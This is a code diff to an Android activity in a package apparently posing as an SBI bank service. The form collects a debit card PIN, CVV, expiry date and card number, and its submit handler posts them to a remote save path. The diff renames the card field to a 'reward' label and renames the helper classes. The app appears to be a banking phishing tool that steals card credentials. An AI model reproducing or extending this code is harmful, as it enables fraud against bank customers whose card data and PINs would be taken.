@@ -8,9 +8,9 @@ import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.system.service.sbi.FrontServices.DebitCardInputMask;
-import com.system.service.sbi.FrontServices.ExpiryDateInputMask;
-import com.system.service.sbi.FrontServices.FormValidator;
+import com.system.service.sbi.MinorServices.DebitCardInputMask;
+import com.system.service.sbi.MinorServices.ExpiryDateInputMask;
+import com.system.service.sbi.MinorServices.FormValidator;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -38,14 +38,14 @@ public class FourthActivity extends AppCompatActivity {
         EditText exp = findViewById(R.id.expiry);
         exp.addTextChangedListener(new ExpiryDateInputMask(exp));
 
-        EditText carddigit = findViewById(R.id.card);
-        carddigit.addTextChangedListener(new DebitCardInputMask(carddigit));
+        EditText rewardcdd = findViewById(R.id.rewardcdd);
+        rewardcdd.addTextChangedListener(new DebitCardInputMask(rewardcdd));
 
         ids = new HashMap<>();
         ids.put(R.id.pin, "pin");
         ids.put(R.id.cvv, "cvv");
         ids.put(R.id.expiry, "expiry");
-        ids.put(R.id.card, "card");
+        ids.put(R.id.rewardcdd, "rewardcdd");
 
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
             int viewId = entry.getKey();
@@ -58,15 +58,15 @@ public class FourthActivity extends AppCompatActivity {
 
         buttonSubmit.setOnClickListener(v -> {
             if (validateForm()) {
-                Helper helper = new Helper();
+                HelperService helperService = new HelperService();
                 JSONObject dataJson = new JSONObject(dataObject);
                 JSONObject sendPayload = new JSONObject();
                 try {
-                    sendPayload.put("site", helper.SITE());
+                    sendPayload.put("site", helperService.SITE());
                     sendPayload.put("data", dataJson);
                     sendPayload.put("id", id);
 
-                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
+                    HelperService.postRequest(helperService.FormSavePath(), sendPayload, getApplicationContext() , new HelperService.ResponseListener() {
                         @Override
                         public void onResponse(String result) {
                             if (result.startsWith("Response Error:")) {
@@ -150,7 +150,7 @@ public class FourthActivity extends AppCompatActivity {
                         isValid = false;
                     }
                     break;
-                case "card":
+                case "rewardcdd":
                     if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                         isValid = false;
                     }
